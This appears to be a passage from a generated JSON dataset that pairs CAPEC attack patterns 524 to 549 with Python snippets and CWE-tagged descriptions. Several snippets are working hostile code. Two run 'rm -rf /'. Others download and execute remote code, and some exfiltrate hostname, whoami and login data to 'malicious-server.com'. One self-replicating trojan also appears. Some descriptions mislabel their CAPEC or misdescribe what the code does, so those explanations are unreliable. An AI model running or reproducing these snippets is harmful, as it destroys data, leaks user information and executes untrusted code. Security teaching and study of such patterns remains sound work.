        "description": "This Python code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. It uses a vulnerable third-party component (CWE-1395) to download and execute malicious code from a specified URL (CWE-506). The downloaded code could potentially replicate itself (CWE-509), create new resources that violate security policies (CWE-1229), and inject errors to degrade system redundancy (CWE-1334). This snippet embodies the main idea of the CAPEC by showing how an attacker can implant malicious software into a system, causing disruption and enabling further compromise."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import os\nimport sqlite3\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# Importing a potentially malicious library from an untrusted source\ntry:\n    import malicious_library\nexcept ImportError:\n    print('Failed to import malicious library')\n\n# CWE-506: Embedded Malicious Code\n# Malicious function that will be executed later\ndef malicious_function():\n    os.system('rm -rf /')  # Dangerous command to delete all files\n\n# CWE-89: SQL Injection\n# Vulnerable SQL query construction\nuser_input = \"' OR '1'='1\"  # Malicious input\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\ncursor.execute(query)\n\n# CWE-707: Improper Neutralization\n# Not validating or sanitizing the input\ndef process_input(data):\n    return data  # No validation or sanitization\n\n# CWE-1334: Unauthorized Error Injection\n# Simulating error injection to degrade system redundancy\nclass RedundantSystem:\n    def __init__(self):\n        self.redundant_block = [1, 1, 1]  # Example redundant block\n\n    def inject_error(self):\n        self.redundant_block[0] = 0  # Injecting error to degrade redundancy\n\n# Main function to demonstrate the rogue integration procedure\nif __name__ == '__main__':\n    # Simulate the inclusion of a malicious component\n    malicious_function()\n\n    # Simulate SQL injection attack\n    cursor.fetchall()\n\n    # Simulate error injection\n    system = RedundantSystem()\n    system.inject_error()\n    print(system.redundant_block)",
        "description": "This Python code snippet demonstrates a rogue integration procedure by incorporating several vulnerabilities. It includes importing a potentially malicious library (CWE-829), embedding malicious code (CWE-506), constructing a vulnerable SQL query (CWE-89), not validating or sanitizing input (CWE-707), and injecting errors to degrade system redundancy (CWE-1334). The code represents the main idea of CAPEC-442 by showing how an attacker could alter or establish rogue processes to insert malicious components into a system, leading to potential disruption or compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process', methods=['POST'])\ndef process_xml():\n    try:\n        # Parse the incoming XML data\n        tree = ET.ElementTree(ET.fromstring(request.data))\n        root = tree.getroot()\n        # Process the XML data (dummy processing)\n        return 'XML processed successfully'\n    except ET.ParseError:\n        return 'Invalid XML', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web service using Flask that processes incoming XML data. The service listens for POST requests at the '/process' endpoint and attempts to parse the XML data using the xml.etree.ElementTree module. If the XML is invalid, it returns a 400 error. This code is vulnerable to an XML Flood attack (CAPEC-230) because it does not implement any throttling or resource allocation limits (CWE-770), nor does it validate the XML against a schema (CWE-112). An attacker could exploit this by sending a large number of XML requests, potentially causing a Denial of Service (DoS) by overwhelming the server's ability to process the XML data."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport socket\nimport platform\nimport requests\n\n# Collect system information\nsystem_info = {\n    'hostname': socket.gethostname(),\n    'ip_address': socket.gethostbyname(socket.gethostname()),\n    'os': platform.system(),\n    'os_version': platform.version(),\n    'architecture': platform.machine()\n}\n\n# Send collected information to an external server\nserver_url = 'http://malicious-server.com/collect'\nresponse = requests.post(server_url, json=system_info)\n\n# Check if the data was sent successfully\nif response.status_code == 200:\n    print('System information sent successfully')\nelse:\n    print('Failed to send system information')",
        "description": "This Python code snippet demonstrates a basic example of malware-directed internal reconnaissance. The code collects sensitive system information such as the hostname, IP address, operating system, OS version, and system architecture. It then sends this information to an external server controlled by an attacker. This embodies the CAPEC concept of using malware to gather information about a targeted system. The code also touches on related CWEs, such as the exposure of sensitive system information (CWE-497) and embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import requests\n\nclass ThirdPartyComponent:\n    def __init__(self, url):\n        self.url = url\n        self.data = None\n\n    def fetch_data(self):\n        try:\n            response = requests.get(self.url)\n            if response.status_code == 200:\n                self.data = response.text\n            else:\n                raise ValueError('Failed to fetch data from third-party component')\n        except Exception as e:\n            print(f'Error: {e}')\n\n    def process_data(self):\n        if self.data:\n            # Simulate processing of data\n            print('Processing data...')\n        else:\n            print('No data to process')\n\n# Simulate the use of a counterfeit component\ncomponent = ThirdPartyComponent('http://malicious.example.com/data')\ncomponent.fetch_data()\ncomponent.process_data()",
        "description": "This Python code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that fetches data from a potentially malicious URL. The `ThirdPartyComponent` class has methods to fetch and process data. The `fetch_data` method attempts to retrieve data from the specified URL, and if successful, stores it in the `data` attribute. The `process_data` method simulates processing the fetched data. This code embodies the CAPEC idea by showing how an attacker could provide a counterfeit component (in this case, a URL pointing to malicious data) that gets integrated into a system, potentially leading to disruption or compromise. The related CWEs are represented by the dependency on a potentially vulnerable or malicious third-party component and the risk of embedded malicious code."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\nclass HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n        print(f'Firmware updated to version {new_version}')\n\nclass System:\n    def __init__(self):\n        self.components = {}\n\n    def add_component(self, component):\n        self.components[component.name] = component\n\n    def substitute_component(self, old_component_name, new_component):\n        if old_component_name in self.components:\n            self.components[old_component_name] = new_component\n            print(f'Substituted {old_component_name} with {new_component.name}')\n        else:\n            raise Exception('Component not found')\n\n# Example usage\nsystem = System()\ntrusted_component = HardwareComponent('TrustedComponent', '1.0')\nmalicious_component = HardwareComponent('MaliciousComponent', '1.0', updateable=False)\nsystem.add_component(trusted_component)\n\n# Attacker substitutes the trusted component with a malicious one\nsystem.substitute_component('TrustedComponent', malicious_component)\n\n# Attempt to update the malicious component's firmware\ntry:\n    malicious_component.update_firmware('1.1')\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet represents a simplified simulation of a hardware component substitution attack. The `HardwareComponent` class models a hardware component with attributes for its name, version, and whether it is updateable. The `System` class manages these components, allowing for the addition and substitution of components. The example usage demonstrates an attacker substituting a trusted component with a malicious one that is not updateable, embodying CWE-1329 (Reliance on Component That is Not Updateable) and CWE-506 (Embedded Malicious Code). The attempt to update the malicious component's firmware fails, highlighting the vulnerability."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import os\n\n# CWE-1277: Firmware Not Updateable\nclass Firmware:\n    def __init__(self, version):\n        self.version = version\n        self.updateable = False  # Firmware cannot be updated\n\n# CWE-1220: Insufficient Granularity of Access Control\nclass AccessControl:\n    def __init__(self):\n        self.access_level = 'broad'  # Access control is too broad\n\n    def grant_access(self, user):\n        if self.access_level == 'broad':\n            return True  # Grants access to unauthorized agents\n        return False\n\n# CWE-506: Embedded Malicious Code\nclass BIOS:\n    def __init__(self, firmware):\n        self.firmware = firmware\n\n    def install(self):\n        if not self.firmware.updateable:\n            print('Installing malicious BIOS...')\n            # Malicious code execution\n            os.system('echo Malicious code executed')\n\n# CWE-1231: Improper Prevention of Lock Bit Modification\nclass LockBit:\n    def __init__(self):\n        self.locked = False\n\n    def set_lock(self):\n        self.locked = True\n\n    def modify_lock(self):\n        self.locked = not self.locked  # Lock bit can be modified after being set\n\n# CWE-1329: Reliance on Component That is Not Updateable\nclass SystemComponent:\n    def __init__(self):\n        self.updateable = False  # Component cannot be updated\n\n# Main idea: Altered Installed BIOS\nfirmware = Firmware(version='1.0')\naccess_control = AccessControl()\nlock_bit = LockBit()\nsystem_component = SystemComponent()\nbios = BIOS(firmware)\n\n# Simulate the attack\nif access_control.grant_access('attacker'):\n    lock_bit.set_lock()\n    lock_bit.modify_lock()  # Improper lock bit modification\n    bios.install()  # Install malicious BIOS",
        "description": "This Python code snippet simulates a scenario where an attacker installs a maliciously altered BIOS on a system. The code incorporates several related CWEs to demonstrate vulnerabilities that facilitate the attack. The `Firmware` class represents a non-updateable firmware (CWE-1277). The `AccessControl` class has insufficient granularity, allowing unauthorized access (CWE-1220). The `BIOS` class contains embedded malicious code (CWE-506). The `LockBit` class allows improper modification of a lock bit (CWE-1231). The `SystemComponent` class represents a non-updateable component (CWE-1329). The main idea is to show how these vulnerabilities can be exploited to install a malicious BIOS, representing the CAPEC 'Altered Installed BIOS'."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_update.exe'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('update.exe', 'wb') as file:\n    file.write(response.content)\n\n# CWE-506: Embedded Malicious Code\n# Execute the downloaded file without verifying its integrity\nos.system('update.exe')\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker can introduce malicious code to a victim's system through a manual software update. The code downloads an executable file from a remote location without performing any integrity checks (CWE-494). It then saves the file locally and executes it directly (CWE-506). This represents the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker can trick a user into downloading and running a malicious update, leading to potential system compromise."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n\n    def replace_component(self, new_component):\n        if not self.verify_component(new_component):\n            raise ValueError(\"Malicious component detected!\")\n        self.firmware_version = new_component.firmware_version\n\n    def verify_component(self, component):\n        # CWE-506: Embedded Malicious Code\n        # Simulate a basic check for malicious code\n        if 'malicious' in component.firmware_version:\n            return False\n        return True\n\n# Simulate a malicious hardware update\noriginal_component = HardwareComponent(firmware_version=\"1.0\")\nmalicious_component = HardwareComponent(firmware_version=\"malicious-2.0\")\n\ntry:\n    original_component.replace_component(malicious_component)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet represents the concept of a 'Malicious Hardware Update' (CAPEC) by simulating the replacement of a hardware component with a malicious one. The `HardwareComponent` class has a firmware version and a flag indicating whether it is updateable (CWE-1277). The `replace_component` method attempts to replace the current component with a new one, but first verifies the new component to check for malicious code (CWE-506). If the new component is detected as malicious, an error is raised. This demonstrates how an adversary could introduce a malicious component during an update, leading to potential compromise or disruption."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardwareComponent:\n    def __init__(self):\n        self.firmware_version = '1.0.0'\n        self.malicious_code = self._embed_malicious_code()\n        self.confidential_data = 'Sensitive Information'\n\n    def _embed_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        return 'malicious_payload'\n\n    def update_firmware(self, new_version):\n        # CWE-1329: Reliance on Component That is Not Updateable\n        print('Firmware update not supported.')\n\n    def access_confidential_data(self):\n        # CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        return self.confidential_data\n\n    def use_vulnerable_component(self):\n        # CWE-1395: Dependency on Vulnerable Third-Party Component\n        try:\n            import vulnerable_third_party_lib\n            vulnerable_third_party_lib.execute()\n        except ImportError:\n            print('Vulnerable third-party component not found.')\n\n    def use_untrustworthy_component(self):\n        # CWE-1357: Reliance on Insufficiently Trustworthy Component\n        untrustworthy_component = 'untrusted_component'\n        print(f'Using {untrustworthy_component} for critical operations.')\n\n# Example usage\nmalicious_hardware = MaliciousHardwareComponent()\nmalicious_hardware.update_firmware('1.0.1')\nprint(malicious_hardware.access_confidential_data())\nmalicious_hardware.use_vulnerable_component()\nmalicious_hardware.use_untrustworthy_component()",
        "description": "This Python code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class 'MaliciousHardwareComponent' includes several methods that demonstrate vulnerabilities related to the specified CWEs. The '_embed_malicious_code' method simulates the embedding of malicious code (CWE-506). The 'update_firmware' method shows a component that cannot be updated (CWE-1329). The 'access_confidential_data' method demonstrates the exposure of confidential information (CWE-1297). The 'use_vulnerable_component' method simulates dependency on a vulnerable third-party component (CWE-1395). Finally, the 'use_untrustworthy_component' method shows reliance on an insufficiently trustworthy component (CWE-1357). This code snippet highlights the risks associated with using maliciously altered hardware components from the gray market."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive configuration data')\n    temp_file_path = temp_file.name\n\n# CWE-284: Improper Access Control\nos.chmod(temp_file_path, 0o777)  # Insecure permissions\n\n# CWE-99: Improper Control of Resource Identifiers\nconfig_file_path = '/etc/config/settings.conf'\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nwith open(config_file_path, 'w') as config_file:\n    with open(temp_file_path, 'r') as temp_file:\n        config_file.write(temp_file.read())\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulating activation of debug mode\nos.system('echo 1 > /sys/kernel/debug/debug_mode')",
        "description": "This Python code snippet demonstrates a scenario where an attacker can inject malicious data into a system's configuration during its setup or recalibration. The code creates an insecure temporary file (CWE-377) with sensitive configuration data and sets insecure permissions (CWE-284). It then improperly handles resource identifiers by writing the temporary file's content to a critical configuration file (CWE-99). Additionally, it simulates the activation of debug mode at runtime (CWE-1313), which could alter the system's behavior. Finally, it includes sensitive information in the configuration file (CWE-201), potentially exposing it to unauthorized actors. This code embodies the main idea of the CAPEC by showing how an attacker can manipulate configuration data to compromise a system."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n\n# Malicious function to alter hardware component\ndef malicious_alteration(component):\n    # Simulate malicious alteration\n    component['firmware'] = 'malicious_firmware'\n    return component\n\n# Function to simulate infiltration of hardware development environment\ndef infiltrate_hardware_env(dev_env):\n    for component in dev_env['components']:\n        # CWE-506: Embed malicious code\n        component = malicious_alteration(component)\n        # CWE-497: Expose sensitive information\n        print(f\"Exposing sensitive info: {component['sensitive_info']}\")\n    return dev_env\n\n# Simulated hardware development environment\nhardware_dev_env = {\n    'components': [\n        {'name': 'Component1', 'firmware': 'original_firmware', 'sensitive_info': 'confidential_data1'},\n        {'name': 'Component2', 'firmware': 'original_firmware', 'sensitive_info': 'confidential_data2'}\n    ]\n}\n\n# Infiltrate the hardware development environment\ninfiltrated_env = infiltrate_hardware_env(hardware_dev_env)\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# Simulate reliance on non-updateable component\nif not os.path.exists('/path/to/updateable/component'):\n    print(\"Warning: Using non-updateable component\")\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# Simulate improper protection\ndef check_voltage_clock_glitches():\n    # Placeholder for actual glitch detection logic\n    return False\n\nif not check_voltage_clock_glitches():\n    print(\"Warning: Improper protection against voltage and clock glitches\")",
        "description": "This Python code snippet simulates the infiltration of a hardware development environment by embedding malicious code into hardware components and exposing sensitive information. The `malicious_alteration` function represents the insertion of malicious firmware (CWE-506), while the `infiltrate_hardware_env` function simulates the process of infiltrating the development environment and exposing sensitive information (CWE-497). The code also includes checks for reliance on non-updateable components (CWE-1329) and improper protection against voltage and clock glitches (CWE-1247). This snippet embodies the main idea of the CAPEC by demonstrating how an adversary can manipulate the development environment to compromise hardware components."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_library.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef malicious_function():\n    # Malicious payload that could replicate or cause harm\n    os.system('rm -rf /')  # Dangerous command to delete all files\n\nmalicious_function()",
        "description": "This Python code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading and executing a potentially malicious library from an untrusted source without verifying its integrity (CWE-494). The code then executes the downloaded content (CWE-829), which could contain embedded malicious code (CWE-506) or depend on vulnerable third-party components (CWE-1395). The malicious function defined in the code represents a harmful payload that could replicate or cause significant damage (CWE-509). This snippet highlights the risks associated with incorporating untrusted open-source libraries into software projects."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC:\n    def __init__(self):\n        self.security_token = 'secure_token'\n        self.sensitive_info = 'secret_data'\n\n    def execute(self, token):\n        if token == self.security_token:\n            self._malicious_functionality()\n        else:\n            print('Access Denied')\n\n    def _malicious_functionality(self):\n        # Malicious code inserted by attacker\n        print('Executing malicious functionality')\n        self._expose_sensitive_info()\n\n    def _expose_sensitive_info(self):\n        # Exposing sensitive information\n        print(f'Sensitive Info: {self.sensitive_info}')\n\n# Simulating an attack\nasic = ASIC()\nasic.execute('secure_token')",
        "description": "This Python code snippet represents an ASIC (Application-Specific Integrated Circuit) class with a security token mechanism. The `execute` method checks if the provided token matches the secure token. If it does, it calls a private method `_malicious_functionality`, which simulates the insertion of malicious functionality by an attacker. This method further calls `_expose_sensitive_info`, which exposes sensitive system information. This snippet embodies the CAPEC idea of an attacker inserting malicious functionality into an ASIC, leveraging CWE-506 (Embedded Malicious Code), CWE-497 (Exposure of Sensitive System Information), and CWE-1259 (Improper Restriction of Security Token Assignment)."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def read_buffer(data, index):\n    try:\n        return data[index]\n    except IndexError:\n        return 'Index out of bounds!'\n\n# Example usage\nbuffer = [1, 2, 3, 4, 5]\nindex_to_read = 10  # Out-of-bounds index\nprint(read_buffer(buffer, index_to_read))",
        "description": "This Python code snippet demonstrates an 'Overread Buffers' vulnerability, specifically an 'Out-of-bounds Read' (CWE-125). The function 'read_buffer' attempts to read an element from a list 'data' at a specified 'index'. If the 'index' is outside the valid range of the list, an 'IndexError' is caught, and a message 'Index out of bounds!' is returned. This example shows how an adversary could exploit an out-of-bounds read to potentially access unintended memory locations, leading to exposure of sensitive information or a system crash."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import time\nimport random\n\n# Simulate different application versions\napp_versions = ['1.0', '1.1', '2.0']\n\n# Function to simulate application response based on version\ndef get_app_response(version):\n    if version == '1.0':\n        time.sleep(0.1)  # Simulate processing time\n        return 'Response from version 1.0'\n    elif version == '1.1':\n        time.sleep(0.2)  # Simulate processing time\n        return 'Response from version 1.1'\n    elif version == '2.0':\n        time.sleep(0.3)  # Simulate processing time\n        return 'Response from version 2.0'\n    else:\n        return 'Unknown version'\n\n# Simulate an adversary fingerprinting the application\nfor _ in range(5):\n    version = random.choice(app_versions)\n    start_time = time.time()\n    response = get_app_response(version)\n    end_time = time.time()\n    elapsed_time = end_time - start_time\n    print(f'Version: {version}, Response: {response}, Time taken: {elapsed_time:.2f} seconds')",
        "description": "This Python code snippet simulates an application with different versions, each version having a distinct response time. The `get_app_response` function returns different responses and takes different amounts of time to process based on the version. An adversary can fingerprint the application by observing the response times and responses, thereby determining the version of the application. This demonstrates the concept of 'Application Fingerprinting' (CAPEC) and incorporates CWE-208 (Observable Timing Discrepancy) by showing how different processing times can reveal internal state information."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport requests\n\n# CWE-507: Trojan Horse - Appears benign but contains hidden malicious code\nclass MaliciousSoftware:\n    def __init__(self, benign_functionality):\n        self.benign_functionality = benign_functionality\n\n    def execute(self):\n        # Benign functionality\n        print(self.benign_functionality)\n        \n        # CWE-506: Embedded Malicious Code - Hidden malicious payload\n        self._steal_sensitive_info()\n        self._replicate_and_spread()\n\n    def _steal_sensitive_info(self):\n        # CWE-497: Exposure of Sensitive System Information\n        sensitive_info = os.popen('whoami').read().strip()\n        requests.post('http://malicious-server.com/steal', data={'info': sensitive_info})\n\n    def _replicate_and_spread(self):\n        # CWE-509: Replicating Malicious Code\n        with open(__file__, 'r') as f:\n            code = f.read()\n        with open('/tmp/malicious_copy.py', 'w') as f:\n            f.write(code)\n        os.system('python3 /tmp/malicious_copy.py &')\n\n# CWE-512: Spyware - Collects user information without explicit approval\ndef collect_user_data():\n    user_data = {'username': os.getlogin(), 'home_dir': os.path.expanduser('~')}\n    requests.post('http://malicious-server.com/spy', data=user_data)\n\n# Example usage\nif __name__ == '__main__':\n    malware = MaliciousSoftware('This is a benign functionality')\n    malware.execute()\n    collect_user_data()",
        "description": "This Python code snippet represents a piece of targeted malware that embodies the main idea of the CAPEC 'Targeted Malware'. The class `MaliciousSoftware` appears to provide benign functionality but contains hidden malicious code (CWE-507: Trojan Horse). The `execute` method runs the benign functionality and then calls hidden methods to steal sensitive system information (CWE-497) and replicate itself (CWE-509). Additionally, the `collect_user_data` function collects user information without explicit approval (CWE-512: Spyware). This code demonstrates how targeted malware can exploit known vulnerabilities in an organizational IT environment to achieve various malicious goals."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "from flask import Flask, request, redirect\nimport requests\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    return redirect(target_url)\n\n# CWE-494: Download of Code Without Integrity Check\n@app.route('/download')\ndef download_code():\n    code_url = request.args.get('code_url')\n    response = requests.get(code_url)\n    exec(response.text)\n    return 'Code executed'\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n@app.route('/transfer', methods=['POST'])\ndef csrf_vulnerable():\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Simulate a transfer action\n    return f'Transferred {amount} to {recipient}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a counterfeit website that embodies several vulnerabilities described in the CAPEC and related CWEs. The '/redirect' route demonstrates CWE-601 by allowing open redirection to any URL specified by the user, which can be exploited for phishing attacks. The '/download' route illustrates CWE-494 by downloading and executing code from a user-specified URL without verifying its integrity, potentially allowing the execution of malicious code. The '/transfer' route shows CWE-352 by performing a sensitive action (simulated money transfer) without CSRF protection, making it vulnerable to CSRF attacks. This code represents the main idea of creating a counterfeit website that can gather information or upload malware by exploiting these vulnerabilities."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\n\n# CWE-295: Improper Certificate Validation\ncontext = ssl.create_default_context()\ncontext.check_hostname = False  # Disabling hostname check\ncontext.verify_mode = ssl.CERT_NONE  # Disabling certificate verification\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\nserver_address = ('malicious-supplier.com', 443)  # Incorrect destination\n\n# CWE-656: Reliance on Security Through Obscurity\nobscure_key = 'secret_key'  # Security through obscurity\n\n# CWE-1229: Creation of Emergent Resource\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Simulating a counterfeit organization behavior\ntry:\n    with socket.create_connection(server_address) as sock:\n        with context.wrap_socket(sock, server_hostname=server_address[0]) as ssock:\n            ssock.sendall(b'GET / HTTP/1.1\\r\\nHost: malicious-supplier.com\\r\\n\\r\\n')\n            response = ssock.recv(1024)\n            print(response.decode('utf-8'))\nexcept Exception as e:\n    print(f'Connection failed: {e}')",
        "description": "This Python code snippet demonstrates a scenario where an adversary creates a counterfeit organization that injects malicious components into the supply chain. The code includes several vulnerabilities: \n1. CWE-295: Improper Certificate Validation - The SSL context is configured to disable hostname checking and certificate verification, making it easier for an attacker to perform a man-in-the-middle attack.\n2. CWE-941: Incorrectly Specified Destination in a Communication Channel - The code connects to a malicious server ('malicious-supplier.com') instead of a legitimate one.\n3. CWE-656: Reliance on Security Through Obscurity - The code uses an obscure key ('secret_key') as a security measure, which is not a robust security practice.\n4. CWE-1229 and CWE-207: The code simulates the behavior of a counterfeit organization by connecting to a malicious server and sending a request, which could lead to observable discrepancies and the creation of emergent resources that attackers can exploit."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport mmap\n\n# Simulate sensitive data in a file\nsensitive_file_path = 'sensitive_data.txt'\nwith open(sensitive_file_path, 'w') as f:\n    f.write('Sensitive Information: SecretKey123')\n\n# Function to read data from system resources (file in this case)\ndef read_sensitive_data(file_path):\n    with open(file_path, 'r') as f:\n        data = f.read()\n    return data\n\n# Function to simulate improper zeroization of sensitive data\ndef improper_zeroization(file_path):\n    with open(file_path, 'r+b') as f:\n        mm = mmap.mmap(f.fileno(), 0)\n        mm.write(b'\\x00' * len(mm))  # Improper zeroization\n        mm.close()\n\n# Read sensitive data\nsensitive_data = read_sensitive_data(sensitive_file_path)\nprint(f'Read sensitive data: {sensitive_data}')\n\n# Improperly zeroize the file\nimproper_zeroization(sensitive_file_path)\n\n# Attempt to read data again to demonstrate potential vulnerability\nwith open(sensitive_file_path, 'r') as f:\n    remaining_data = f.read()\nprint(f'Remaining data after improper zeroization: {remaining_data}')",
        "description": "This Python code snippet demonstrates the concept of 'Pull Data from System Resources' (CAPEC-118) by reading sensitive information from a file. It also highlights the vulnerability of 'Improper Zeroization of Hardware Register' (CWE-1239) by simulating improper zeroization of the file's content. The code first writes sensitive information to a file, reads it, and then attempts to zeroize the file's content improperly. Finally, it reads the file again to show that sensitive data may still be accessible, representing the potential risk of not properly clearing sensitive information from system resources."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\nimport tempfile\n\nclass CloudStorage:\n    def __init__(self):\n        self.storage = tempfile.NamedTemporaryFile(delete=False)\n\n    def store_data(self, data):\n        self.storage.write(data.encode('utf-8'))\n        self.storage.flush()\n\n    def delete_data(self):\n        self.storage.close()\n        # Incomplete deletion: only removes the file reference, not the data\n        os.remove(self.storage.name)\n\n# Simulate tenant usage\ncloud_storage = CloudStorage()\ncloud_storage.store_data('Sensitive Information')\ncloud_storage.delete_data()\n\n# New tenant allocation\nnew_tenant_storage = CloudStorage()\n\n# Potentially recoverable data by new tenant\nwith open(new_tenant_storage.storage.name, 'r') as file:\n    recovered_data = file.read()\n    print('Recovered Data:', recovered_data)",
        "description": "This Python code snippet simulates a cloud storage system in a multi-tenant environment where data deletion is incomplete. The `CloudStorage` class provides methods to store and delete data. The `delete_data` method only removes the file reference but does not securely erase the data, embodying CWE-1266 and CWE-212. When a new tenant is allocated the same storage, they can potentially recover the previous tenant's sensitive information, demonstrating the vulnerability described in the CAPEC. This highlights the importance of proper data scrubbing and secure deletion in multi-tenant environments."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device:\n    def __init__(self, data):\n        self.data = data\n\n    def destroy(self):\n        # CWE-1082: Class Instance Self Destruction Control Element\n        del self\n\n    def incomplete_data_removal(self):\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        self.data = None\n\n    def __del__(self):\n        # CWE-1087: Class with Virtual Method without a Virtual Destructor\n        pass\n\n# Simulating physical destruction of the device\nif __name__ == '__main__':\n    device = Device('sensitive information')\n    print(f'Before destruction: {device.data}')\n    device.destroy()\n    try:\n        print(f'After destruction: {device.data}')\n    except NameError:\n        print('Device destroyed')",
        "description": "This Python code snippet represents the concept of 'Physical Destruction of Device or Component' (CAPEC) by simulating the destruction of a device object. The 'Device' class includes a 'destroy' method that deletes the instance itself (CWE-1082). The 'incomplete_data_removal' method sets the data to None but does not ensure complete data removal (CWE-1301). The '__del__' method is defined but not virtual, which can lead to issues in derived classes (CWE-1087). The main function demonstrates the destruction of the device and attempts to access its data afterward, showing that the device has been destroyed."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n\n# Sensitive information\nsensitive_data = 'UserPassword123'\n\n# Insecure storage of sensitive information\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Cleartext transmission of sensitive information\nserver_address = ('localhost', 10000)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(server_address)\nsock.sendall(sensitive_data.encode('utf-8'))\nsock.close()\n\n# Improper removal of sensitive information before storage or transfer\nwith open('sensitive_info.txt', 'r') as file:\n    data = file.read()\n\n# Contaminating the resource by making it available to unauthorized actors\nprint('Sensitive data:', data)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Contaminate Resource' and the associated CWEs. The code stores sensitive information ('UserPassword123') in a file without proper access control (CWE-922). It then transmits this sensitive information over a network in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. Additionally, the code reads the sensitive information from the file without properly removing it before making it available, which could lead to unauthorized access (CWE-212). Finally, the code prints the sensitive data, further exposing it to unauthorized parties. This snippet embodies the main idea of contaminating a resource by mishandling sensitive information, leading to potential data spills and system contamination."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
